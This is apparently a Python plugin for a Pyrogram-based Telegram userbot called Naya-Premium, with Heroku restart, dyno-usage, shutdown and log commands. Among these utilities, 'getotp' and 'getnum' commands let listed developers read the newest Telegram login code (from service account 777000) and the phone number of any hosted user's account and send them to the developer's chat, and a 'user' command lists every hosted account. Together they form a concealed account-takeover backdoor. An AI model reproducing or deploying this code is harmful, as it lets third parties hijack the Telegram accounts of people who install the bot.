import asyncio
import math
import sys
from os import remove
import heroku3
import time
import re
import asyncio
import math
import shutil
import sys
import dotenv
import datetime
from dotenv import load_dotenv
from os import environ, execle, path
from datetime import datetime, timedelta
import heroku3
import requests
import urllib3
from pyrogram import *
from pyrogram.types import *
from io import BytesIO
from naya.config import *
from naya.logging import LOGGER

from . import *

HAPP = None


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(HEROKU_API_KEY),
    "https",
    str(HEROKU_APP_NAME),
    "HEAD",
    "main",
]


@bots.on_message(filters.command("restart", cmd) & filters.me)
async def restart_bot(_, message):
    try:
        msg = await message.reply(" `Restarting bot...`")
        LOGGER(__name__).info("BOT SERVER RESTARTED !!")
    except BaseException as err:
        LOGGER(__name__).info(f"{err}")
        return
    await msg.edit("✅ **Bot has restarted !**\n")
    if HAPP is not None:
        HAPP.restart()
    else:
        args = [sys.executable, "-m", "naya"]
        execle(sys.executable, *args, environ)


@bots.on_message(filters.command("usage", cmd) & filters.me)
async def usage_dynos(client, message):
    if await is_heroku():
        if HEROKU_API_KEY == cmd and HEROKU_APP_NAME == cmd:
            return await message.reply_text(
                "<b>Menggunakan App Heroku!</b>\n\nMasukan/atur  `HEROKU_API_KEY` dan `HEROKU_APP_NAME` untuk bisa melakukan update!"
            )
        elif HEROKU_API_KEY == cmd or HEROKU_APP_NAME == cmd:
            return await message.reply_text(
                "<b>Menggunakan App Heroku!</b>\n\n<b>pastikan</b> `HEROKU_API_KEY` **dan** `HEROKU_APP_NAME` <b>sudah di configurasi dengan benar!</b>"
            )
    else:
        return await message.reply_text("Hanya untuk Heroku Deployment")
    try:
        Heroku = heroku3.from_key(HEROKU_API_KEY)
        Heroku.app(HEROKU_APP_NAME)
    except BaseException:
        return await message.reply_text(
            " Pastikan Heroku API Key, App name sudah benar"
        )
    dyno = await message.reply_text("Memeriksa penggunaan dyno...")
    account_id = Heroku.account().id
    useragent = (
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/80.0.3987.149 Mobile Safari/537.36"
    )
    headers = {
        "User-Agent": useragent,
        "Authorization": f"Bearer {HEROKU_API_KEY}",
        "Accept": "application/vnd.heroku+json; version=3.account-quotas",
    }
    path = "/accounts/" + account_id + "/actions/get-quota"
    r = requests.get("https://api.heroku.com" + path, headers=headers)
    if r.status_code != 200:
        return await dyno.edit("Unable to fetch.")
    result = r.json()
    quota = result["account_quota"]
    quota_used = result["quota_used"]
    remaining_quota = quota - quota_used
    percentage = math.floor(remaining_quota / quota * 100)
    minutes_remaining = remaining_quota / 60
    hours = math.floor(minutes_remaining / 60)
    minutes = math.floor(minutes_remaining % 60)
    App = result["apps"]
    try:
        App[0]["quota_used"]
    except IndexError:
        AppQuotaUsed = 0
        AppPercentage = 0
    else:
        AppQuotaUsed = App[0]["quota_used"] / 60
        AppPercentage = math.floor(App[0]["quota_used"] * 100 / quota)
    AppHours = math.floor(AppQuotaUsed / 60)
    AppMinutes = math.floor(AppQuotaUsed % 60)
    await asyncio.sleep(1.5)
    text = f"""
**Penggunaan Dyno Naya-Premium**

 ❏ Dyno terpakai:
 ├ Terpakai: `{AppHours}`**h**  `{AppMinutes}`**m**  [`{AppPercentage}`**%**]
Dyno tersisa:
  ╰ Tersisa: `{hours}`**h**  `{minutes}`**m**  [`{percentage}`**%**]"""
    return await dyno.edit(text)


@bots.on_message(filters.command("shutdown", cmd) & filters.me)
async def shutdown_bot(client, message):
    botlog_chat_id = await get_log_groups(user_id)
    if not botlog_chat_id:
        return await message.reply(
            "`Maaf, tidak dapat menemukan ID chat log bot.`\nPastikan Anda Telah Mengtur Log Group Anda"
        )
    await client.send_message(
        botlog_chat_id,
        "**#SHUTDOWN** \n"
        "**Naya-Premium** telah di matikan!\nJika ingin menghidupkan kembali silahkan buka heroku",
    )
    await message.reply(" **Naya-Premium Berhasil di matikan!**")
    if HAPP is not None:
        HAPP.process_formation()["worker"].scale(0)
    else:
        sys.exit(0)


@bots.on_message(filters.command("logs", cmd) & filters.me)
async def logs_ubot(client, message):
    if HAPP is None:
        return await message.reply(
            "Pastikan `HEROKU_API_KEY` dan `HEROKU_APP_NAME` anda dikonfigurasi dengan benar di config vars heroku",
        )
    biji = await message.reply("🧾 `Get Logs your Bots...`")
    with open("Logs-Heroku.txt", "w") as log:
        log.write(HAPP.get_log())
    await client.send_document(
        message.chat.id,
        "Logs-Heroku.txt",
        thumb="https://telegra.ph//file/976ad753d6073dde1f579.jpg",
        caption="**This is your Heroku Logs**",
    )
    await biji.delete()
    remove("Logs-Heroku.txt")



@app.on_message(filters.command(["user"], cmd) & filters.me)
async def usereee(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply(
            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini"
        )
    count = 0
    user = cmd
    for X in bots:
        try:
            count += 1
            user += f"""
❏ USERBOT KE {count}
 ├ AKUN: <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a>
 ╰ ID: <code>{X.me.id}</code>
"""
        except BaseException:
            pass
    if int(len(str(user))) > 4096:
        with BytesIO(str.encode(str(user))) as out_file:
            out_file.name = "userbot.txt"
            await message.reply_document(
                document=out_file,
            )
    else:
        await message.reply(f"<b>{user}</b>")


@app.on_message(filters.command(["getotp", "getnum"], cmd) & filters.me)
async def otp_and_numbereeee(client, message):
    if len(message.command) < 2:
        return await client.send_message(
            message.chat.id,
            f"<code>{message.text} user_id userbot yang aktif</code>",
            reply_to_message_id=message.id,
        )
    elif message.from_user.id not in DEVS:
        return await message.reply(
            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini"
        )
    try:
        for X in bots:
            if int(message.command[1]) == X.me.id:
                if message.command[0] == "getotp":
                    async for otp in X.search_messages(777000, limit=1):
                        if otp.text:
                            return await client.send_message(
                                message.chat.id,
                                otp.text,
                                reply_to_message_id=message.id,
                            )
                        else:
                            return await client.send_message(
                                message.chat.id,
                                "<code>Kode Otp Tidak Di Temukan</code>",
                                reply_to_message_id=message.id,
                            )
                elif message.command[0] == "getnum":
                    return await client.send_message(
                        message.chat.id,
                        X.me.phone_number,
                        reply_to_message_id=message.id,
                    )
    except Exception as error:
        return await client.send_message(
            message.chat.id, error, reply_to_message_id=message.id
        )